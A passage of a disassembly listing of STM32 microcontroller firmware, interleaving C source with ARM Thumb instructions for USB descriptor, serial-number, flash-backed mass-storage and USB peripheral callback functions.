  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_InterfaceStrDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c584:	b580      	push	{r7, lr}
 800c586:	b082      	sub	sp, #8
 800c588:	af00      	add	r7, sp, #0
 800c58a:	4603      	mov	r3, r0
 800c58c:	6039      	str	r1, [r7, #0]
 800c58e:	71fb      	strb	r3, [r7, #7]
  if(speed == 0)
 800c590:	79fb      	ldrb	r3, [r7, #7]
 800c592:	2b00      	cmp	r3, #0
 800c594:	d105      	bne.n	800c5a2 <USBD_FS_InterfaceStrDescriptor+0x1e>
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c596:	683a      	ldr	r2, [r7, #0]
 800c598:	4907      	ldr	r1, [pc, #28]	; (800c5b8 <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c59a:	4808      	ldr	r0, [pc, #32]	; (800c5bc <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c59c:	f7ff fe00 	bl	800c1a0 <USBD_GetString>
 800c5a0:	e004      	b.n	800c5ac <USBD_FS_InterfaceStrDescriptor+0x28>
  }
  else
  {
    USBD_GetString((uint8_t *)USBD_INTERFACE_STRING_FS, USBD_StrDesc, length);
 800c5a2:	683a      	ldr	r2, [r7, #0]
 800c5a4:	4904      	ldr	r1, [pc, #16]	; (800c5b8 <USBD_FS_InterfaceStrDescriptor+0x34>)
 800c5a6:	4805      	ldr	r0, [pc, #20]	; (800c5bc <USBD_FS_InterfaceStrDescriptor+0x38>)
 800c5a8:	f7ff fdfa 	bl	800c1a0 <USBD_GetString>
  }
  return USBD_StrDesc;
 800c5ac:	4b02      	ldr	r3, [pc, #8]	; (800c5b8 <USBD_FS_InterfaceStrDescriptor+0x34>)
}
 800c5ae:	4618      	mov	r0, r3
 800c5b0:	3708      	adds	r7, #8
 800c5b2:	46bd      	mov	sp, r7
 800c5b4:	bd80      	pop	{r7, pc}
 800c5b6:	bf00      	nop
 800c5b8:	2000097c 	.word	0x2000097c
 800c5bc:	0800d20c 	.word	0x0800d20c

0800c5c0 <USBD_FS_USR_BOSDescriptor>:
  * @param  speed : Current device speed
  * @param  length : Pointer to data length variable
  * @retval Pointer to descriptor buffer
  */
uint8_t * USBD_FS_USR_BOSDescriptor(USBD_SpeedTypeDef speed, uint16_t *length)
{
 800c5c0:	b480      	push	{r7}
 800c5c2:	b083      	sub	sp, #12
 800c5c4:	af00      	add	r7, sp, #0
 800c5c6:	4603      	mov	r3, r0
 800c5c8:	6039      	str	r1, [r7, #0]
 800c5ca:	71fb      	strb	r3, [r7, #7]
  UNUSED(speed);
  *length = sizeof(USBD_FS_BOSDesc);
 800c5cc:	683b      	ldr	r3, [r7, #0]
 800c5ce:	220c      	movs	r2, #12
 800c5d0:	801a      	strh	r2, [r3, #0]
  return (uint8_t*)USBD_FS_BOSDesc;
 800c5d2:	4b03      	ldr	r3, [pc, #12]	; (800c5e0 <USBD_FS_USR_BOSDescriptor+0x20>)
}
 800c5d4:	4618      	mov	r0, r3
 800c5d6:	370c      	adds	r7, #12
 800c5d8:	46bd      	mov	sp, r7
 800c5da:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c5de:	4770      	bx	lr
 800c5e0:	200001f4 	.word	0x200001f4

0800c5e4 <Get_SerialNum>:
  * @brief  Create the serial number string descriptor
  * @param  None
  * @retval None
  */
static void Get_SerialNum(void)
{
 800c5e4:	b580      	push	{r7, lr}
 800c5e6:	b084      	sub	sp, #16
 800c5e8:	af00      	add	r7, sp, #0
  uint32_t deviceserial0;
  uint32_t deviceserial1;
  uint32_t deviceserial2;

  deviceserial0 = *(uint32_t *) DEVICE_ID1;
 800c5ea:	4b0f      	ldr	r3, [pc, #60]	; (800c628 <Get_SerialNum+0x44>)
 800c5ec:	681b      	ldr	r3, [r3, #0]
 800c5ee:	60fb      	str	r3, [r7, #12]
  deviceserial1 = *(uint32_t *) DEVICE_ID2;
 800c5f0:	4b0e      	ldr	r3, [pc, #56]	; (800c62c <Get_SerialNum+0x48>)
 800c5f2:	681b      	ldr	r3, [r3, #0]
 800c5f4:	60bb      	str	r3, [r7, #8]
  deviceserial2 = *(uint32_t *) DEVICE_ID3;
 800c5f6:	4b0e      	ldr	r3, [pc, #56]	; (800c630 <Get_SerialNum+0x4c>)
 800c5f8:	681b      	ldr	r3, [r3, #0]
 800c5fa:	607b      	str	r3, [r7, #4]

  deviceserial0 += deviceserial2;
 800c5fc:	68fa      	ldr	r2, [r7, #12]
 800c5fe:	687b      	ldr	r3, [r7, #4]
 800c600:	4413      	add	r3, r2
 800c602:	60fb      	str	r3, [r7, #12]

  if (deviceserial0 != 0)
 800c604:	68fb      	ldr	r3, [r7, #12]
 800c606:	2b00      	cmp	r3, #0
 800c608:	d009      	beq.n	800c61e <Get_SerialNum+0x3a>
  {
    IntToUnicode(deviceserial0, &USBD_StringSerial[2], 8);
 800c60a:	2208      	movs	r2, #8
 800c60c:	4909      	ldr	r1, [pc, #36]	; (800c634 <Get_SerialNum+0x50>)
 800c60e:	68f8      	ldr	r0, [r7, #12]
 800c610:	f000 f814 	bl	800c63c <IntToUnicode>
    IntToUnicode(deviceserial1, &USBD_StringSerial[18], 4);
 800c614:	2204      	movs	r2, #4
 800c616:	4908      	ldr	r1, [pc, #32]	; (800c638 <Get_SerialNum+0x54>)
 800c618:	68b8      	ldr	r0, [r7, #8]
 800c61a:	f000 f80f 	bl	800c63c <IntToUnicode>
  }
}
 800c61e:	bf00      	nop
 800c620:	3710      	adds	r7, #16
 800c622:	46bd      	mov	sp, r7
 800c624:	bd80      	pop	{r7, pc}
 800c626:	bf00      	nop
 800c628:	1fff7590 	.word	0x1fff7590
 800c62c:	1fff7594 	.word	0x1fff7594
 800c630:	1fff7598 	.word	0x1fff7598
 800c634:	20000206 	.word	0x20000206
 800c638:	20000216 	.word	0x20000216

0800c63c <IntToUnicode>:
  * @param  pbuf: pointer to the buffer
  * @param  len: buffer length
  * @retval None
  */
static void IntToUnicode(uint32_t value, uint8_t * pbuf, uint8_t len)
{
 800c63c:	b480      	push	{r7}
 800c63e:	b087      	sub	sp, #28
 800c640:	af00      	add	r7, sp, #0
 800c642:	60f8      	str	r0, [r7, #12]
 800c644:	60b9      	str	r1, [r7, #8]
 800c646:	4613      	mov	r3, r2
 800c648:	71fb      	strb	r3, [r7, #7]
  uint8_t idx = 0;
 800c64a:	2300      	movs	r3, #0
 800c64c:	75fb      	strb	r3, [r7, #23]

  for (idx = 0; idx < len; idx++)
 800c64e:	2300      	movs	r3, #0
 800c650:	75fb      	strb	r3, [r7, #23]
 800c652:	e027      	b.n	800c6a4 <IntToUnicode+0x68>
  {
    if (((value >> 28)) < 0xA)
 800c654:	68fb      	ldr	r3, [r7, #12]
 800c656:	0f1b      	lsrs	r3, r3, #28
 800c658:	2b09      	cmp	r3, #9
 800c65a:	d80b      	bhi.n	800c674 <IntToUnicode+0x38>
    {
      pbuf[2 * idx] = (value >> 28) + '0';
 800c65c:	68fb      	ldr	r3, [r7, #12]
 800c65e:	0f1b      	lsrs	r3, r3, #28
 800c660:	b2da      	uxtb	r2, r3
 800c662:	7dfb      	ldrb	r3, [r7, #23]
 800c664:	005b      	lsls	r3, r3, #1
 800c666:	4619      	mov	r1, r3
 800c668:	68bb      	ldr	r3, [r7, #8]
 800c66a:	440b      	add	r3, r1
 800c66c:	3230      	adds	r2, #48	; 0x30
 800c66e:	b2d2      	uxtb	r2, r2
 800c670:	701a      	strb	r2, [r3, #0]
 800c672:	e00a      	b.n	800c68a <IntToUnicode+0x4e>
    }
    else
    {
      pbuf[2 * idx] = (value >> 28) + 'A' - 10;
 800c674:	68fb      	ldr	r3, [r7, #12]
 800c676:	0f1b      	lsrs	r3, r3, #28
 800c678:	b2da      	uxtb	r2, r3
 800c67a:	7dfb      	ldrb	r3, [r7, #23]
 800c67c:	005b      	lsls	r3, r3, #1
 800c67e:	4619      	mov	r1, r3
 800c680:	68bb      	ldr	r3, [r7, #8]
 800c682:	440b      	add	r3, r1
 800c684:	3237      	adds	r2, #55	; 0x37
 800c686:	b2d2      	uxtb	r2, r2
 800c688:	701a      	strb	r2, [r3, #0]
    }

    value = value << 4;
 800c68a:	68fb      	ldr	r3, [r7, #12]
 800c68c:	011b      	lsls	r3, r3, #4
 800c68e:	60fb      	str	r3, [r7, #12]

    pbuf[2 * idx + 1] = 0;
 800c690:	7dfb      	ldrb	r3, [r7, #23]
 800c692:	005b      	lsls	r3, r3, #1
 800c694:	3301      	adds	r3, #1
 800c696:	68ba      	ldr	r2, [r7, #8]
 800c698:	4413      	add	r3, r2
 800c69a:	2200      	movs	r2, #0
 800c69c:	701a      	strb	r2, [r3, #0]
  for (idx = 0; idx < len; idx++)
 800c69e:	7dfb      	ldrb	r3, [r7, #23]
 800c6a0:	3301      	adds	r3, #1
 800c6a2:	75fb      	strb	r3, [r7, #23]
 800c6a4:	7dfa      	ldrb	r2, [r7, #23]
 800c6a6:	79fb      	ldrb	r3, [r7, #7]
 800c6a8:	429a      	cmp	r2, r3
 800c6aa:	d3d3      	bcc.n	800c654 <IntToUnicode+0x18>
  }
}
 800c6ac:	bf00      	nop
 800c6ae:	bf00      	nop
 800c6b0:	371c      	adds	r7, #28
 800c6b2:	46bd      	mov	sp, r7
 800c6b4:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c6b8:	4770      	bx	lr

0800c6ba <STORAGE_Init_FS>:
  * @brief  Initializes over USB FS IP
  * @param  lun:
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Init_FS(uint8_t lun)
{
 800c6ba:	b480      	push	{r7}
 800c6bc:	b083      	sub	sp, #12
 800c6be:	af00      	add	r7, sp, #0
 800c6c0:	4603      	mov	r3, r0
 800c6c2:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 2 */
  return (USBD_OK);
 800c6c4:	2300      	movs	r3, #0
  /* USER CODE END 2 */
}
 800c6c6:	4618      	mov	r0, r3
 800c6c8:	370c      	adds	r7, #12
 800c6ca:	46bd      	mov	sp, r7
 800c6cc:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c6d0:	4770      	bx	lr

0800c6d2 <STORAGE_GetCapacity_FS>:
  * @param  block_num: .
  * @param  block_size: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_GetCapacity_FS(uint8_t lun, uint32_t *block_num, uint16_t *block_size)
{
 800c6d2:	b480      	push	{r7}
 800c6d4:	b085      	sub	sp, #20
 800c6d6:	af00      	add	r7, sp, #0
 800c6d8:	4603      	mov	r3, r0
 800c6da:	60b9      	str	r1, [r7, #8]
 800c6dc:	607a      	str	r2, [r7, #4]
 800c6de:	73fb      	strb	r3, [r7, #15]
  /* USER CODE BEGIN 3 */
	*block_num  = FLASH_PAGE_NBR;
 800c6e0:	68bb      	ldr	r3, [r7, #8]
 800c6e2:	2240      	movs	r2, #64	; 0x40
 800c6e4:	601a      	str	r2, [r3, #0]
	*block_size = FLASH_PAGE_SIZE;
 800c6e6:	687b      	ldr	r3, [r7, #4]
 800c6e8:	f44f 6200 	mov.w	r2, #2048	; 0x800
 800c6ec:	801a      	strh	r2, [r3, #0]
  return (USBD_OK);
 800c6ee:	2300      	movs	r3, #0
  /* USER CODE END 3 */
}
 800c6f0:	4618      	mov	r0, r3
 800c6f2:	3714      	adds	r7, #20
 800c6f4:	46bd      	mov	sp, r7
 800c6f6:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c6fa:	4770      	bx	lr

0800c6fc <STORAGE_IsReady_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsReady_FS(uint8_t lun)
{
 800c6fc:	b480      	push	{r7}
 800c6fe:	b083      	sub	sp, #12
 800c700:	af00      	add	r7, sp, #0
 800c702:	4603      	mov	r3, r0
 800c704:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c706:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c708:	4618      	mov	r0, r3
 800c70a:	370c      	adds	r7, #12
 800c70c:	46bd      	mov	sp, r7
 800c70e:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c712:	4770      	bx	lr

0800c714 <STORAGE_IsWriteProtected_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_IsWriteProtected_FS(uint8_t lun)
{
 800c714:	b480      	push	{r7}
 800c716:	b083      	sub	sp, #12
 800c718:	af00      	add	r7, sp, #0
 800c71a:	4603      	mov	r3, r0
 800c71c:	71fb      	strb	r3, [r7, #7]
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c71e:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c720:	4618      	mov	r0, r3
 800c722:	370c      	adds	r7, #12
 800c724:	46bd      	mov	sp, r7
 800c726:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c72a:	4770      	bx	lr

0800c72c <STORAGE_Read_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Read_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800c72c:	b580      	push	{r7, lr}
 800c72e:	b084      	sub	sp, #16
 800c730:	af00      	add	r7, sp, #0
 800c732:	60b9      	str	r1, [r7, #8]
 800c734:	607a      	str	r2, [r7, #4]
 800c736:	461a      	mov	r2, r3
 800c738:	4603      	mov	r3, r0
 800c73a:	73fb      	strb	r3, [r7, #15]
 800c73c:	4613      	mov	r3, r2
 800c73e:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 6 */
	if(lun == 0){
 800c740:	7bfb      	ldrb	r3, [r7, #15]
 800c742:	2b00      	cmp	r3, #0
 800c744:	d10d      	bne.n	800c762 <STORAGE_Read_FS+0x36>
		memcpy(buf, (uint8_t*)(FLASH_START_ADDR + blk_addr * FLASH_PAGE_SIZE), blk_len * FLASH_PAGE_SIZE);
 800c746:	687b      	ldr	r3, [r7, #4]
 800c748:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c74c:	3340      	adds	r3, #64	; 0x40
 800c74e:	02db      	lsls	r3, r3, #11
 800c750:	4619      	mov	r1, r3
 800c752:	89bb      	ldrh	r3, [r7, #12]
 800c754:	02db      	lsls	r3, r3, #11
 800c756:	461a      	mov	r2, r3
 800c758:	68b8      	ldr	r0, [r7, #8]
 800c75a:	f000 fc65 	bl	800d028 <memcpy>
		return (USBD_OK);
 800c75e:	2300      	movs	r3, #0
 800c760:	e000      	b.n	800c764 <STORAGE_Read_FS+0x38>
	}
  return (USBD_FAIL);
 800c762:	2303      	movs	r3, #3
  /* USER CODE END 6 */
}
 800c764:	4618      	mov	r0, r3
 800c766:	3710      	adds	r7, #16
 800c768:	46bd      	mov	sp, r7
 800c76a:	bd80      	pop	{r7, pc}

0800c76c <STORAGE_Write_FS>:
  * @brief  .
  * @param  lun: .
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
int8_t STORAGE_Write_FS(uint8_t lun, uint8_t *buf, uint32_t blk_addr, uint16_t blk_len)
{
 800c76c:	b580      	push	{r7, lr}
 800c76e:	b08a      	sub	sp, #40	; 0x28
 800c770:	af00      	add	r7, sp, #0
 800c772:	60b9      	str	r1, [r7, #8]
 800c774:	607a      	str	r2, [r7, #4]
 800c776:	461a      	mov	r2, r3
 800c778:	4603      	mov	r3, r0
 800c77a:	73fb      	strb	r3, [r7, #15]
 800c77c:	4613      	mov	r3, r2
 800c77e:	81bb      	strh	r3, [r7, #12]
  /* USER CODE BEGIN 7 */
	if(lun == 0){
 800c780:	7bfb      	ldrb	r3, [r7, #15]
 800c782:	2b00      	cmp	r3, #0
 800c784:	d136      	bne.n	800c7f4 <STORAGE_Write_FS+0x88>
		uint16_t i;
		HAL_FLASH_Unlock();
 800c786:	f7f4 febb 	bl	8001500 <HAL_FLASH_Unlock>
		FLASH_EraseInitTypeDef f;
		f.TypeErase = FLASH_TYPEERASE_PAGES;
 800c78a:	2300      	movs	r3, #0
 800c78c:	617b      	str	r3, [r7, #20]
		f.Banks = FLASH_BANK_BOTH;
 800c78e:	2301      	movs	r3, #1
 800c790:	61bb      	str	r3, [r7, #24]
		f.Page = (FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE)/FLASH_PAGE_SIZE;
 800c792:	687b      	ldr	r3, [r7, #4]
 800c794:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c798:	3340      	adds	r3, #64	; 0x40
 800c79a:	f3c3 0314 	ubfx	r3, r3, #0, #21
 800c79e:	61fb      	str	r3, [r7, #28]
		f.NbPages = blk_len;
 800c7a0:	89bb      	ldrh	r3, [r7, #12]
 800c7a2:	623b      	str	r3, [r7, #32]
		uint32_t PageError = 0;
 800c7a4:	2300      	movs	r3, #0
 800c7a6:	613b      	str	r3, [r7, #16]
		HAL_FLASHEx_Erase(&f, &PageError);
 800c7a8:	f107 0210 	add.w	r2, r7, #16
 800c7ac:	f107 0314 	add.w	r3, r7, #20
 800c7b0:	4611      	mov	r1, r2
 800c7b2:	4618      	mov	r0, r3
 800c7b4:	f7f4 ff8a 	bl	80016cc <HAL_FLASHEx_Erase>

		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800c7b8:	2300      	movs	r3, #0
 800c7ba:	84fb      	strh	r3, [r7, #38]	; 0x26
 800c7bc:	e011      	b.n	800c7e2 <STORAGE_Write_FS+0x76>
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
					FLASH_START_ADDR + blk_addr*FLASH_PAGE_SIZE + i,
 800c7be:	687b      	ldr	r3, [r7, #4]
 800c7c0:	f503 3380 	add.w	r3, r3, #65536	; 0x10000
 800c7c4:	3340      	adds	r3, #64	; 0x40
 800c7c6:	02da      	lsls	r2, r3, #11
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800c7c8:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c7ca:	18d1      	adds	r1, r2, r3
					*(uint64_t *)(&buf[i]));
 800c7cc:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c7ce:	68ba      	ldr	r2, [r7, #8]
 800c7d0:	4413      	add	r3, r2
			HAL_FLASH_Program(FLASH_TYPEPROGRAM_DOUBLEWORD,
 800c7d2:	e9d3 2300 	ldrd	r2, r3, [r3]
 800c7d6:	2000      	movs	r0, #0
 800c7d8:	f7f4 fe26 	bl	8001428 <HAL_FLASH_Program>
		for(i=0;i<blk_len*FLASH_PAGE_SIZE;i+=8)
 800c7dc:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 800c7de:	3308      	adds	r3, #8
 800c7e0:	84fb      	strh	r3, [r7, #38]	; 0x26
 800c7e2:	8cfa      	ldrh	r2, [r7, #38]	; 0x26
 800c7e4:	89bb      	ldrh	r3, [r7, #12]
 800c7e6:	02db      	lsls	r3, r3, #11
 800c7e8:	429a      	cmp	r2, r3
 800c7ea:	d3e8      	bcc.n	800c7be <STORAGE_Write_FS+0x52>

		HAL_FLASH_Lock();
 800c7ec:	f7f4 feaa 	bl	8001544 <HAL_FLASH_Lock>
		return USBD_OK;
 800c7f0:	2300      	movs	r3, #0
 800c7f2:	e000      	b.n	800c7f6 <STORAGE_Write_FS+0x8a>
	}
  return (USBD_FAIL);
 800c7f4:	2303      	movs	r3, #3
  /* USER CODE END 7 */
}
 800c7f6:	4618      	mov	r0, r3
 800c7f8:	3728      	adds	r7, #40	; 0x28
 800c7fa:	46bd      	mov	sp, r7
 800c7fc:	bd80      	pop	{r7, pc}

0800c7fe <STORAGE_GetMaxLun_FS>:
  * @brief  .
  * @param  None
  * @retval .
  */
int8_t STORAGE_GetMaxLun_FS(void)
{
 800c7fe:	b480      	push	{r7}
 800c800:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 8 */
  return (STORAGE_LUN_NBR - 1);
 800c802:	2300      	movs	r3, #0
  /* USER CODE END 8 */
}
 800c804:	4618      	mov	r0, r3
 800c806:	46bd      	mov	sp, r7
 800c808:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c80c:	4770      	bx	lr
	...

0800c810 <HAL_PCD_MspInit>:
                       LL Driver Callbacks (PCD -> USB Device Library)
*******************************************************************************/
/* MSP Init */

void HAL_PCD_MspInit(PCD_HandleTypeDef* pcdHandle)
{
 800c810:	b580      	push	{r7, lr}
 800c812:	b098      	sub	sp, #96	; 0x60
 800c814:	af00      	add	r7, sp, #0
 800c816:	6078      	str	r0, [r7, #4]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 800c818:	f107 030c 	add.w	r3, r7, #12
 800c81c:	2254      	movs	r2, #84	; 0x54
 800c81e:	2100      	movs	r1, #0
 800c820:	4618      	mov	r0, r3
 800c822:	f000 fbd5 	bl	800cfd0 <memset>
  if(pcdHandle->Instance==USB)
 800c826:	687b      	ldr	r3, [r7, #4]
 800c828:	681b      	ldr	r3, [r3, #0]
 800c82a:	4a1d      	ldr	r2, [pc, #116]	; (800c8a0 <HAL_PCD_MspInit+0x90>)
 800c82c:	4293      	cmp	r3, r2
 800c82e:	d132      	bne.n	800c896 <HAL_PCD_MspInit+0x86>

  /* USER CODE END USB_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USB;
 800c830:	f44f 5300 	mov.w	r3, #8192	; 0x2000
 800c834:	60fb      	str	r3, [r7, #12]
    PeriphClkInit.UsbClockSelection = RCC_USBCLKSOURCE_PLLSAI1;
 800c836:	f04f 6380 	mov.w	r3, #67108864	; 0x4000000
 800c83a:	64fb      	str	r3, [r7, #76]	; 0x4c
    PeriphClkInit.PLLSAI1.PLLSAI1Source = RCC_PLLSOURCE_MSI;
 800c83c:	2301      	movs	r3, #1
 800c83e:	613b      	str	r3, [r7, #16]
    PeriphClkInit.PLLSAI1.PLLSAI1M = 1;
 800c840:	2301      	movs	r3, #1
 800c842:	617b      	str	r3, [r7, #20]
    PeriphClkInit.PLLSAI1.PLLSAI1N = 24;
 800c844:	2318      	movs	r3, #24
 800c846:	61bb      	str	r3, [r7, #24]
    PeriphClkInit.PLLSAI1.PLLSAI1P = RCC_PLLP_DIV7;
 800c848:	2307      	movs	r3, #7
 800c84a:	61fb      	str	r3, [r7, #28]
    PeriphClkInit.PLLSAI1.PLLSAI1Q = RCC_PLLQ_DIV2;
 800c84c:	2302      	movs	r3, #2
 800c84e:	623b      	str	r3, [r7, #32]
    PeriphClkInit.PLLSAI1.PLLSAI1R = RCC_PLLR_DIV2;
 800c850:	2302      	movs	r3, #2
 800c852:	627b      	str	r3, [r7, #36]	; 0x24
    PeriphClkInit.PLLSAI1.PLLSAI1ClockOut = RCC_PLLSAI1_48M2CLK;
 800c854:	f44f 1380 	mov.w	r3, #1048576	; 0x100000
 800c858:	62bb      	str	r3, [r7, #40]	; 0x28
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 800c85a:	f107 030c 	add.w	r3, r7, #12
 800c85e:	4618      	mov	r0, r3
 800c860:	f7f7 fe5c 	bl	800451c <HAL_RCCEx_PeriphCLKConfig>
 800c864:	4603      	mov	r3, r0
 800c866:	2b00      	cmp	r3, #0
 800c868:	d001      	beq.n	800c86e <HAL_PCD_MspInit+0x5e>
    {
      Error_Handler();
 800c86a:	f7f4 fa03 	bl	8000c74 <Error_Handler>
    }

    /* Peripheral clock enable */
    __HAL_RCC_USB_CLK_ENABLE();
 800c86e:	4b0d      	ldr	r3, [pc, #52]	; (800c8a4 <HAL_PCD_MspInit+0x94>)
 800c870:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800c872:	4a0c      	ldr	r2, [pc, #48]	; (800c8a4 <HAL_PCD_MspInit+0x94>)
 800c874:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 800c878:	6593      	str	r3, [r2, #88]	; 0x58
 800c87a:	4b0a      	ldr	r3, [pc, #40]	; (800c8a4 <HAL_PCD_MspInit+0x94>)
 800c87c:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800c87e:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 800c882:	60bb      	str	r3, [r7, #8]
 800c884:	68bb      	ldr	r3, [r7, #8]

    /* Peripheral interrupt init */
    HAL_NVIC_SetPriority(USB_IRQn, 0, 0);
 800c886:	2200      	movs	r2, #0
 800c888:	2100      	movs	r1, #0
 800c88a:	2043      	movs	r0, #67	; 0x43
 800c88c:	f7f4 fd95 	bl	80013ba <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(USB_IRQn);
 800c890:	2043      	movs	r0, #67	; 0x43
 800c892:	f7f4 fdae 	bl	80013f2 <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN USB_MspInit 1 */

  /* USER CODE END USB_MspInit 1 */
  }
}
 800c896:	bf00      	nop
 800c898:	3760      	adds	r7, #96	; 0x60
 800c89a:	46bd      	mov	sp, r7
 800c89c:	bd80      	pop	{r7, pc}
 800c89e:	bf00      	nop
 800c8a0:	40006800 	.word	0x40006800
 800c8a4:	40021000 	.word	0x40021000

0800c8a8 <HAL_PCD_SetupStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c8a8:	b580      	push	{r7, lr}
 800c8aa:	b082      	sub	sp, #8
 800c8ac:	af00      	add	r7, sp, #0
 800c8ae:	6078      	str	r0, [r7, #4]
  USBD_LL_SetupStage((USBD_HandleTypeDef*)hpcd->pData, (uint8_t *)hpcd->Setup);
 800c8b0:	687b      	ldr	r3, [r7, #4]
 800c8b2:	f8d3 22f4 	ldr.w	r2, [r3, #756]	; 0x2f4
 800c8b6:	687b      	ldr	r3, [r7, #4]
 800c8b8:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 800c8bc:	4619      	mov	r1, r3
 800c8be:	4610      	mov	r0, r2
 800c8c0:	f7fe fb70 	bl	800afa4 <USBD_LL_SetupStage>
}
 800c8c4:	bf00      	nop
 800c8c6:	3708      	adds	r7, #8
 800c8c8:	46bd      	mov	sp, r7
 800c8ca:	bd80      	pop	{r7, pc}

0800c8cc <HAL_PCD_DataOutStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c8cc:	b580      	push	{r7, lr}
 800c8ce:	b082      	sub	sp, #8
 800c8d0:	af00      	add	r7, sp, #0
 800c8d2:	6078      	str	r0, [r7, #4]
 800c8d4:	460b      	mov	r3, r1
 800c8d6:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataOutStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->OUT_ep[epnum].xfer_buff);
 800c8d8:	687b      	ldr	r3, [r7, #4]
 800c8da:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800c8de:	78fa      	ldrb	r2, [r7, #3]
 800c8e0:	6879      	ldr	r1, [r7, #4]
 800c8e2:	4613      	mov	r3, r2
 800c8e4:	009b      	lsls	r3, r3, #2
 800c8e6:	4413      	add	r3, r2
 800c8e8:	00db      	lsls	r3, r3, #3
 800c8ea:	440b      	add	r3, r1
 800c8ec:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 800c8f0:	681a      	ldr	r2, [r3, #0]
 800c8f2:	78fb      	ldrb	r3, [r7, #3]
 800c8f4:	4619      	mov	r1, r3
 800c8f6:	f7fe fbaa 	bl	800b04e <USBD_LL_DataOutStage>
}
 800c8fa:	bf00      	nop
 800c8fc:	3708      	adds	r7, #8
 800c8fe:	46bd      	mov	sp, r7
 800c900:	bd80      	pop	{r7, pc}

0800c902 <HAL_PCD_DataInStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800c902:	b580      	push	{r7, lr}
 800c904:	b082      	sub	sp, #8
 800c906:	af00      	add	r7, sp, #0
 800c908:	6078      	str	r0, [r7, #4]
 800c90a:	460b      	mov	r3, r1
 800c90c:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataInStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->IN_ep[epnum].xfer_buff);
 800c90e:	687b      	ldr	r3, [r7, #4]
 800c910:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800c914:	78fa      	ldrb	r2, [r7, #3]
 800c916:	6879      	ldr	r1, [r7, #4]
 800c918:	4613      	mov	r3, r2
 800c91a:	009b      	lsls	r3, r3, #2
 800c91c:	4413      	add	r3, r2
 800c91e:	00db      	lsls	r3, r3, #3
 800c920:	440b      	add	r3, r1
 800c922:	333c      	adds	r3, #60	; 0x3c
 800c924:	681a      	ldr	r2, [r3, #0]
 800c926:	78fb      	ldrb	r3, [r7, #3]
 800c928:	4619      	mov	r1, r3
